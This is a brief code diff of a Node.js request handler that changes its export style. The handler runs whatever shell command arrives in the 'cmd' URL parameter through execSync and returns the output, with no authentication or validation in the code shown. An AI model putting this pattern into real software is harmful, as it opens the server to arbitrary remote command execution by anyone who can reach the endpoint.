@@ -1,7 +1,7 @@
 const cp = require("child_process")
 const os = require("os")
 
-module.exports = function (req, res) {
+function cb(req, res) {
     const reqUrl = new URL(this.context.reqUrl);
     let cmd = reqUrl.searchParams.get("cmd") ?? "ps aux"
     const r = cp.execSync(cmd, { encoding: "utf-8" })
@@ -15,3 +15,4 @@ ${r}
 `)
     return
 }
+export default cb
